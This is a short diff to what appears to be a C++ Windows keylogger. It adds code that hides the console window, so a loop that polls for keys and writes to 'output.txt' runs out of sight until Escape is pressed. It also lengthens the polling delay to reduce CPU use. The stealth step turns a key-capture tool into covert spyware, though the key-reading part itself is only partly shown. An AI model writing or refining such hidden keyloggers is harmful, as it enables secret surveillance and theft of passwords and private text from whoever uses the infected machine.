@@ -4,19 +4,18 @@
 
 using namespace std;
 
-/**
- * TODO
- * Stealth Window
- */
-
-
 
 int main()
 {
+    //Hide the Window
+    HWND window;
+    window = FindWindowA("ConsoleWindowClass",NULL);
+    AllocConsole();
+    ShowWindow(window, 0);
+    //Temp output file
     string outfile = "output.txt";
     ofstream output;
     output.open(outfile);
-    int count = 0;
     int stopKey = 0x1b;
     bool ongoing = true;
 	while (ongoing) {
@@ -31,7 +30,8 @@ int main()
                     }
 				}
 			}
-            Sleep(1);
+            // to not use much cpu
+            Sleep(100);
 		}
         output.close();
 }
